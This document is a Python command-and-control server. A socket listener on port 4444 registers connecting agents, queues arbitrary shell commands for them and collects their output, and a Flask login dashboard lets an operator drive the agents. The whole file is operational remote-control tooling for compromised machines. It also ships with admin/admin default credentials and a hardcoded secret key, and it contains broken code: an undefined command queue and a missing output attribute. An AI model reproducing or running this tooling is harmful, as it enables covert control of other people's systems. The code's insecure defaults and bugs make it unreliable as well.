from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
import os
import users
import socket
import threading
import queue
import readline

# C2 Server IP and port configuration
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

# Flask stuff
app = Flask(__name__)
app.secret_key = "ac2_secret"

# Keep track of registered agents
registered_addresses = set()
registered_agents_id = [None] # Lookup by id
registered_agents_ip = {} # Lookup by ip
curr_id = 1

class Agent:
    def __init__(self, id, ip, hostname):
        self.id = id
        self.ip = ip
        self.hostname = hostname
        self.command_queue = queue.Queue()

# Function to handle client connections
def handle_client(client_socket, client_address):
    if client_address[0] not in registered_addresses:
        try:
            # Get hostname
            command = "hostname" + "\n"
            print(f"[+] Sending command to {client_address}: {command}")
            client_socket.sendall(command.encode())

            # Receive output from the client until the delimiter
            buffer = b''
            while b'ac2delim' not in buffer:
                data = client_socket.recv(4096)
                if not data:
                    break  # Exit if client closes the connection
                buffer += data
            
            # Extract output
            output = buffer.partition(b'ac2delim')[0].decode()
            
            # Register the agent
            registered_addresses.add(client_address[0])
            global curr_id
            new_agent = Agent(curr_id, client_address[0], output.strip())
            curr_id += 1
            registered_agents_id.append(new_agent)
            registered_agents_ip[client_address[0]] = new_agent
            print(f"[+] Registered new agent {new_agent.hostname} ({new_agent.ip})")

        except Exception as e:
            print(f"[!] Error with client {client_address}: {e}")
        finally:
            print(f"[-] Connection closed for {client_address}")
            client_socket.close()
    else:
        try:
            agent = registered_agents_ip[client_address[0]]
            while True:
                # Check if there are commands in the queue for the agent
                if not agent.command_queue.empty():
                    # Get the next command from the queue
                    command = agent.command_queue.get()
                    print(f"[+] Sending command to {client_address}: {command}")
                    client_socket.sendall(command.encode())

                    # Receive output from the client until the delimiter
                    buffer = b''
                    while b'ac2delim' not in buffer:
                        data = client_socket.recv(4096)
                        if not data:
                            break  # Exit if client closes the connection
                        buffer += data
                    
                    # Extract and display the output up to the delimiter
                    output = buffer.partition(b'ac2delim')[0].decode()
                    print(f"Output from {client_address}:\n{output}")
                else:
                    break
        except Exception as e:
            print(f"[!] Error with client {client_address}: {e}")
        finally:
            print(f"[-] Connection closed for {client_address}")
            client_socket.close()

def start_server():
    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen()
    print(f"Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")

    try:
        while True:
            # Accept a new client
            client_socket, client_address = server_socket.accept()
            print(f"[+] Accepted connection from {client_address}")
            
            # Create a new thread to handle each client
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down the server.")
    finally:
        server_socket.close()


@app.route('/')
def home():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if users.validate_user(username, password):
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password!', 'danger')
    return render_template('login.html')


@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        flash('Please log in to access the dashboard.', 'warning')
        return redirect(url_for('login'))
    return render_template('dashboard.html', username=session['username'], agents=registered_agents_id[1:])


@app.route('/submit_command', methods=['POST'])
def submit_command():
    command = request.form.get('command')
    if command:
        command_queue.append(command)
        flash(f'Command "{command}" added to queue!', 'info')
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.pop('username', None)
    flash('You have been logged out!', 'info')
    return redirect(url_for('login'))

@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.get_json()
    agent_id = int(data["agent_id"])
    command = data["command"]
    agent = registered_agents_id[agent_id]

    if agent:
        agent.command_queue.put(command + "\n")
        # Wait until the output is received
        # This is simplified for the sake of example; a more robust setup might be asynchronous
        response_output = agent.output  # Assuming `output` has been updated by the client response

        return jsonify({"success": True, "output": response_output})
    else:
        return jsonify({"success": False, "error": "Invalid agent ID"}), 400

if __name__ == '__main__':
    # Default creds
    if not os.path.exists("creds.db"):
        users.register("admin", "admin")

    # Run C2 Server in separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    # Run Flask in main thread
    app.run()

